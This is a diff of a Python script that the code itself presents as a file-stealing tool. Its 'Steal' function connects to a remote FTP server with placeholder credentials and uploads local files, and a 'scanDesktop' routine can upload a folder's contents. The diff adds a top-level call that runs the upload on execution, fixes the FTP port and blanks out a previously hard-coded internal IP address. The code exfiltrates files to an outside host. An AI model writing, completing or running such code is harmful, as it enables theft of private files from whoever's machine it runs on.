@@ -4,13 +4,13 @@ import os
 
 
 def Steal(filename):
-    ip = '--------------' # insert ip address
-    port = 22
-    username = '-----------' # insert username
-    password = '-----------' # insert password
+    ip = '------------' # insert ip address
+    port = 21
+    username = '---------' # insert username
+    password = '---------' # insert password
 
     ftp = ftplib.FTP() # annouce FTP object
-    ftp.connect(ip)
+    ftp.connect(ip, port)
     ftp.login(username, password)
 
 
@@ -24,6 +24,7 @@ def Steal(filename):
 
 
     file_path = os.path.join(local_path, filename)
+    print('--------------------->',local_path)
     fileupload = open(file_path, 'rb')
 
     result = ftp.storbinary('STOR ' + filename, fileupload) # send files via ftp to server
@@ -36,7 +37,7 @@ def Steal(filename):
     ftp.close()
 
 
-Steal('log.txt')
+# Steal('hello.txt')
 
 
 def scanDesktop(path='Desktop', upload=False):
@@ -69,8 +70,8 @@ def scanDesktop(path='Desktop', upload=False):
 
 
 def download():
-    ip = '172.23.7.161' # insert ip address
-    port = 2002
+    ip = '--------------' # insert ip address
+    port = 21
     username = '-------------' # insert username
     password = '-------------' # insert password
 
@@ -88,3 +89,5 @@ def download():
 
     ftp.close()
 
+scanDesktop('test-upload', upload=True)
+# Steal('saich-desktop.txt')
